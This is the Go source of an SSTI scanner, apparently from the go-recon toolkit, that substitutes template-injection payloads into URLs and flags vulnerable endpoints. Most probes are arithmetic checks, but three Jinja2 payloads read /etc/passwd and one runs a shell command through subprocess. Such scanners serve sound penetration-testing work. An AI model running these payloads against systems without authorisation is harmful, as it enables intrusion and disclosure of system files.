package main

import (
  "encoding/csv"
  "os"
  "bufio"
  "strings"
  "sync"
  "math/rand"
  "net/http"
  "bytes"
  "time"
  "encoding/json"
  "github.com/D3Ext/go-recon/core"
  "fmt"
  "log"
  "flag"
  "io/ioutil"
  "github.com/fatih/color"
  "strconv"
)

var red func(a ...interface{}) string = color.New(color.FgRed).SprintFunc()
var cyan func(a ...interface{}) string = color.New(color.FgCyan).SprintFunc()
var green func(a ...interface{}) string = color.New(color.FgGreen).SprintFunc()
var magenta func(a ...interface{}) string = color.New(color.FgMagenta).SprintFunc()
var yellow func(a ...interface{}) string = color.New(color.FgYellow).SprintFunc()

type SstiInfo struct {
	Urls   []string `json:"urls"`
	Length int      `json:"length"`
	Time   string   `json:"time"`
}

// Define a struct to match the JSON payload structure
type PayloadEntry struct {
	Payload  string `json:"payload"`
	Response string `json:"response"`
  Engine   string `json:"engine"`
}

func generatePayload() (int, int) {
	rand.Seed(time.Now().UnixNano()) // Seed for randomness
	num1 := rand.Intn(50) + 1        // Random number 1
	num2 := rand.Intn(50) + 1        // Random number 2
	return num1, num2
}

// Function to load and parse the JSON file
func loadPayloads(data []byte) (map[string]PayloadEntry, error) {

	// Parse JSON into a map
	var payloads map[string]PayloadEntry
  err := json.Unmarshal(data, &payloads)
	if err != nil {
		return nil, fmt.Errorf("failed to parse JSON: %w", err)
	}

	return payloads, nil
}

var found_ssti []string

func helpPanel() {
	fmt.Println(`Usage of gr-ssti:
  INPUT:
    -u, -url string       url to check for SSTI (i.e. https://example.com/?foo=FUZZ)
    -l, -list string      file containing a list of urls to check (one url per line)

  OUTPUT:
    -o, -output string          file to write vulnerable urls into (TXT format)
    -oj, -output-json string    file to write vulnerable urls into (JSON format)
    -oc, -output-csv string     file to write vulnerable urls into (CSV format)

  PAYLOADS:
    -k, -keyword string           keyword to replace in urls with payloads (default=FUZZ)
    -s, -skip                     only test most common payloads (useful for in-mass testing)

  CONFIG:
    -w, -workers int        number of concurrent workers (default=15)
    -m, -method string      requests method (GET, POST, PUT...)
    -H, -header string      include custom headers (separated by semicolon) on HTTP requests
    -a, -agent string       user agent to include on requests (default=generic agent)
    -p, -proxy string       proxy to send requests through (i.e. http://127.0.0.1:8080)
    -t, -timeout int        milliseconds to wait before each request timeout (default=4000)
    -c, -color              use color on output
    -q, -quiet              print neither banner nor logging, only print output

  DEBUG:
    -version      show go-recon version
    -h, -help     print help panel

Examples:
    gr-ssti -u https://example.com/?foo=FUZZ -c
    gr-ssti -u https://example.com/?foo=TEST -k TEST
    gr-ssti -l urls.txt -skip
    gr-ssti -l urls.txt -pl payloads.json -o vulnerable_urls.txt
    cat urls.txt | gr-ssti
    `)
}

func main(){
	var url string
	var list string
	var keyword string
	var workers int
	var skip bool
	var method string
  var header string
	var proxy string
	var timeout int
	var user_agent string
	var output string
	var json_output string
  var csv_output string
	var use_color bool
	var quiet bool
	var version bool
	var help bool
	var stdin bool

	flag.StringVar(&url, "u", "", "")
	flag.StringVar(&url, "url", "", "")
	flag.StringVar(&list, "l", "", "")
	flag.StringVar(&list, "list", "", "")
	flag.StringVar(&keyword, "k", "FUZZ", "")
	flag.StringVar(&keyword, "keyword", "FUZZ", "")
	flag.BoolVar(&skip, "s", false, "")
	flag.BoolVar(&skip, "skip", false, "")
	flag.IntVar(&workers, "w", 10, "")
	flag.IntVar(&workers, "workers", 10, "")
	flag.StringVar(&method, "m", "GET", "")
	flag.StringVar(&method, "method", "GET", "")
  flag.StringVar(&header, "H", "", "")
  flag.StringVar(&header, "header", "", "")
	flag.StringVar(&user_agent, "a", "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "")
	flag.StringVar(&user_agent, "agent", "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "")
	flag.StringVar(&proxy, "p", "", "")
	flag.StringVar(&proxy, "proxy", "", "")
	flag.IntVar(&timeout, "t", 4000, "")
	flag.IntVar(&timeout, "timeout", 4000, "")
	flag.StringVar(&output, "o", "", "")
	flag.StringVar(&output, "output", "", "")
	flag.StringVar(&json_output, "oj", "", "")
	flag.StringVar(&json_output, "output-json", "", "")
  flag.StringVar(&csv_output, "oc", "", "")
  flag.StringVar(&csv_output, "output-csv", "", "")
	flag.BoolVar(&use_color, "c", false, "")
	flag.BoolVar(&use_color, "color", false, "")
	flag.BoolVar(&quiet, "q", false, "")
	flag.BoolVar(&quiet, "quiet", false, "")
	flag.BoolVar(&version, "version", false, "")
	flag.BoolVar(&help, "h", false, "")
	flag.BoolVar(&help, "help", false, "")
	flag.Parse()

	t1 := core.StartTimer()

	if version {
		fmt.Println("go-recon version:", core.Version())
		os.Exit(0)
	}

	if !quiet {
		fmt.Println(core.Banner())
	}

	if help {
		fmt.Println()
		helpPanel()
		os.Exit(0)
	}

	// Check if stdin has value
	fi, err := os.Stdin.Stat()
	if err != nil {
		log.Fatal(err)
	}

	if fi.Mode()&os.ModeNamedPipe == 0 {
		stdin = false // stdin is empty
	} else {
		stdin = true // stdin has value
	}

	// if domain, list and stdin parameters are empty print help panel and exit
	if (url == "") && (list == "") && (!stdin) {
		helpPanel()
		os.Exit(0)
	}

	if proxy != "" {
		os.Setenv("HTTP_PROXY", proxy)
		os.Setenv("HTTPS_PROXY", proxy)
	}

	var txt_out *os.File
	if output != "" {
		txt_out, err = os.Create(output)
		if err != nil {
			log.Fatal(err)
		}
	}

  // Create requests client
  client := core.CreateHttpClient(timeout)

  var csv_info [][]string
	var payloads map[string]PayloadEntry

  // generate dynamic payloads to avoid false positives
  num1, num2 := generatePayload()
  rand_str := core.RandomString(core.RandomInt(4, 5))

	if skip { // set common payloads for in-mass testing
    data := `
{
  "payload1": {
    "payload": "` + rand_str + `{{` + strconv.Itoa(num1) + `*` + strconv.Itoa(num2) + `}}` + rand_str + `",
    "response": "` + rand_str + `` + strconv.Itoa(num1*num2) + `` + rand_str + `",
    "engine": "Jinja2"
  },
  
  "payload2": {
    "payload": "` + rand_str + `{` + strconv.Itoa(num1) + `*` + strconv.Itoa(num2) + `}` + rand_str + `",
    "response": "` + rand_str + `` + strconv.Itoa(num1*num2) + `` + rand_str + `",
    "engine": "Freemarker"
  },

  "payload3": {
    "payload": "` + rand_str + `${` + strconv.Itoa(num1) + `*` + strconv.Itoa(num2) + `}` + rand_str + `",
    "response": "` + rand_str + `` + strconv.Itoa(num1*num2) + `` + rand_str + `",
    "engine": "Freemarker"
  }
}
`

		payloads, err = loadPayloads([]byte(data))
    if err != nil {
      log.Fatal(err)
    }

	} else { // set default payloads
    data := `
{
  "payload1": {
    "payload": "` + rand_str + `{{` + strconv.Itoa(num1) + `*` + strconv.Itoa(num2) + `}}` + rand_str + `",
    "response": "` + rand_str + strconv.Itoa(num1*num2) + rand_str + `",
    "engine": "Jinja2"
  },
  
  "payload2": {
    "payload": "` + rand_str + `{` + strconv.Itoa(num1) + `*` + strconv.Itoa(num2) + `}` + rand_str + `",
    "response": "` + rand_str + strconv.Itoa(num1*num2) + rand_str + `",
    "engine": "Freemarker"
  },

  "payload3": {
    "payload": "` + rand_str + `${` + strconv.Itoa(num1) + `*` + strconv.Itoa(num2) + `}` + rand_str + `",
    "response": "` + rand_str + `` + strconv.Itoa(num1*num2) + `` + rand_str + `",
    "engine": "Freemarker"
  },

  "payload4": {
    "payload": "` + rand_str + `@(` + strconv.Itoa(num1) + `+` + strconv.Itoa(num2) + `)` + rand_str + `",
    "response": "` + rand_str + strconv.Itoa(num1+num2) + rand_str + `",
    "engine": "Java"
  },

  "payload5": {
    "payload": "` + rand_str + `#{` + strconv.Itoa(num1) + `*` + strconv.Itoa(num2) + `}` + rand_str + `",
    "response": "` + rand_str + strconv.Itoa(num1*num2) + rand_str + `",
    "engine": "Java"
  },

  "payload6": {
    "payload": "` + rand_str + `X#{XXXXXX}` + rand_str + `",
    "response": "` + rand_str + `X` + rand_str + `",
    "engine": "Pug"
  },

  "payload7": {
    "payload": "` + rand_str + `X{XXXXXX}` + rand_str + `",
    "response": "` + rand_str + `X` + rand_str + `",
    "engine": "DustJs"
  },

  "payload8": {
    "payload": "` + rand_str + "{\\\"XX\\\"}" + rand_str + `",
    "response": "` + rand_str + `XX` + rand_str + `",
    "engine": "Smarty"
  },

  "payload9": {
    "payload": "` + rand_str + `<%= ` + strconv.Itoa(num1) + ` * ` + strconv.Itoa(num2) + ` %>` + rand_str + `",
    "response": "` + rand_str + strconv.Itoa(num1*num2) + rand_str + `",
    "engine": "Erb"
  },
  
  "payload10": {
    "payload": "` + rand_str + `X{{Context.lookup}}X` + rand_str + `",
    "response": "` + rand_str + `XX` + rand_str + `",
    "engine": "Mustache"
  },

  "payload11": {
    "payload": "` + rand_str + "{{=\\\"" + rand_str + "\\\"}}" + rand_str + `",
    "response": "` + rand_str + rand_str + rand_str + `",
    "engine": "Dot"
  },

  "payload12": {
    "payload": "` + rand_str + "{{printf \\\"" + rand_str + "\\\"}}" + rand_str + `",
    "response": "` + rand_str + rand_str + rand_str + `",
    "engine": "Golang"
  },

  "payload13": {
    "payload": "` + rand_str + "${\\\"" + rand_str + "\\\"}" + rand_str + `",
    "response": "` + rand_str + rand_str + rand_str + `",
    "engine": "Groovy"
  },

  "payload14": {
    "payload": "` + rand_str + `[[${session}]]X` + rand_str + `",
    "response": "` + rand_str + `X` + rand_str + `",
    "engine": "Thymeleaf"
  },

  "payload15": {
    "payload": "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}",
    "response": "root:x:0:0:root:",
    "engine": "Jinja2"
  },
  
  "payload16": {
    "payload": "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
    "response": "root:x:0:0:root:",
    "engine": "Jinja2"
  },

  "payload17": {
    "payload": "{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}",
    "response": "root:x:0:0:root:",
    "engine": "Jinja2"
  }
}
`

    //fmt.Println(data)
		payloads, err = loadPayloads([]byte(data))
    if err != nil {
      log.Fatal(err)
    }
	}

	if !quiet {
		core.Warning("Use with caution.", use_color)
		core.Magenta("Concurrent workers: "+strconv.Itoa(workers), use_color)
		if proxy != "" {
			core.Magenta("Proxy: "+proxy, use_color)
		}

		if skip {
			core.Magenta("Using most common payloads", use_color)
		}

		core.Magenta("Looking for SSTI with "+strconv.Itoa(len(payloads))+" payloads\n", use_color)
	}

	var counter int
	urls_c := make(chan string) // Create channel which holds urls to use
  payloads_c := make(chan PayloadEntry)
	var wg sync.WaitGroup

	if url != "" {
		if !strings.Contains(url, keyword) {
			core.Red("Url doesn't contain keyword ("+keyword+")", use_color)
			os.Exit(0)
		}

    if !quiet {
      core.Magenta("Testing connection with URL...\n", use_color)
      time.Sleep(100 * time.Millisecond)
    }

    req, err := http.NewRequest(method, url, nil)
    if err != nil {
      log.Fatal(err)
    }

    _, err = client.Do(req) // Send requests with out custom client config
    if err != nil {
      log.Fatal(err)
    }

		for i := 0; i < workers; i++ {
			wg.Add(1)

			go func() {
				for entry := range payloads_c { // test all payloads on current url
					new_url := strings.Replace(url, keyword, entry.Payload, -1) // Replace keyword in url with each payload
					req, err := http.NewRequest(method, new_url, nil)
					if err != nil {
						continue
					}

          if header != "" {
            for _, h := range strings.Split(header, ";") {
              header_name := strings.Split(h, ":")[0]
              header_value := strings.ReplaceAll(strings.Split(h, ":")[1], " ", "")
              req.Header.Set(header_name, header_value)
            }
          }

          req.Header.Set("User-Agent", user_agent)
					req.Header.Add("Connection", "close")
					req.Close = true

					resp, err := client.Do(req) // Send requests with out custom client config
					if err != nil {
						continue
					}
					defer resp.Body.Close()

          body, err := ioutil.ReadAll(resp.Body)
          if err != nil {
            log.Fatal(err)
          }

          if bytes.Contains(body, []byte(entry.Response)) {
            fmt.Println(new_url, "-", entry.Engine)
            found_ssti = append(found_ssti, new_url)
            csv_info = append(csv_info, []string{url, entry.Payload, entry.Engine})
            counter += 1

            if output != "" { // Write url with payload to output file
              _, err = txt_out.WriteString(new_url + "\n")
              if err != nil {
                log.Fatal(err)
              }
            }

            break
					}
				}

				wg.Done()
			}()
		}

		for _, entry := range payloads {
      //fmt.Println("Entrando: " + entry.Payload)
			payloads_c <- entry
		}

		close(payloads_c)
		wg.Wait()

	} else if (list != "") || (stdin) {

		for i := 0; i < workers; i++ { // create n workers
			wg.Add(1)

			go func() {
				for u := range urls_c { // iterate over urls
					current_url := u

					for _, entry := range payloads { // test all payloads current url
						new_url := strings.Replace(current_url, keyword, entry.Payload, -1) // Replace keyword in url with each payload
						req, err := http.NewRequest(method, new_url, nil)
						if err != nil {
							continue
						}

            if header != "" {
              for _, h := range strings.Split(header, ";") {
                header_name := strings.Split(h, ":")[0]
                header_value := strings.ReplaceAll(strings.Split(h, ":")[1], " ", "")
                req.Header.Set(header_name, header_value)
              }
            }

            req.Header.Set("User-Agent", user_agent)
						req.Header.Add("Connection", "close")
						req.Close = true

						resp, err := client.Do(req) // Send requests with out custom client config
						if err != nil {
							continue
						}
						defer resp.Body.Close()

            body, err := ioutil.ReadAll(resp.Body)
            if err != nil {
              log.Fatal(err)
            }

            if bytes.Contains(body, []byte(entry.Response)) {
              fmt.Println(new_url)
              found_ssti = append(found_ssti, new_url)
              csv_info = append(csv_info, []string{url, entry.Payload, entry.Engine})
              counter += 1

              if output != "" { // Write url with payload to output file
                _, err = txt_out.WriteString(new_url + "\n")
                if err != nil {
                  log.Fatal(err)
                }
              }
            }

					}

				}

				wg.Done() // Finish worker
			}()
		}

		var f *os.File
		var err error

		// Get file descriptor from file or stdin
		if list != "" {
			f, err = os.Open(list)
			if err != nil {
				log.Fatal(err)
			}
			defer f.Close()

		} else if stdin {
			f = os.Stdin
		}

		scanner := bufio.NewScanner(f)
		for scanner.Scan() { // Iterate over every single line
			line := scanner.Text()

			if line != "" {
				urls_c <- line
			}
		}

		close(urls_c) // Close channel
		wg.Wait()     // and wait for urls workers wait group
	}

	if json_output != "" {
		json_redirects := SstiInfo{
			Urls:   found_ssti,
			Length: len(found_ssti),
			Time:   core.TimerDiff(t1).String(),
		}

		json_body, err := json.Marshal(json_redirects)
		if err != nil {
			log.Fatal(err)
		}

		json_out, err := os.Create(json_output)
		if err != nil {
			log.Fatal(err)
		}

		_, err = json_out.WriteString(string(json_body))
		if err != nil {
			log.Fatal(err)
		}
	}

	if csv_output != "" {
		csv_out, err := os.Create(csv_output)
		if err != nil {
			log.Fatal(err)
		}

		writer := csv.NewWriter(csv_out)
		defer writer.Flush()

		headers := []string{"url", "payload", "engine"}

		writer.Write(headers)
		for _, row := range csv_info {
			writer.Write(row)
		}
	}

	// Finally some logging to aid users
	if !quiet {
		if counter >= 1 {
			fmt.Println()
			core.Green(strconv.Itoa(counter)+" SSTI were found", use_color)
		} else {
			core.Red("No SSTI were found!", use_color)
		}

		if counter >= 1 { // Check if at least one url was vulnerable to open redirect
			if output != "" {
				core.Green("Urls written to "+output+" (TXT)", use_color)
			}

			if json_output != "" {
				core.Green("Urls written to "+json_output+" (JSON)", use_color)
			}

      if csv_output != "" {
        core.Green("Urls written to "+csv_output+" (CSV)", use_color)
      }
		}

		if use_color {
			if output != "" || counter >= 1 {
				fmt.Println("["+green("+")+"] Elapsed time:", green(core.TimerDiff(t1)))
			} else {
				fmt.Println("\n["+green("+")+"] Elapsed time:", green(core.TimerDiff(t1)))
			}
		} else {
			if output != "" || counter >= 1 {
				fmt.Println("[+] Elapsed time:", core.TimerDiff(t1))
			} else {
				fmt.Println("\n[+] Elapsed time:", core.TimerDiff(t1))
			}
		}
	}
}


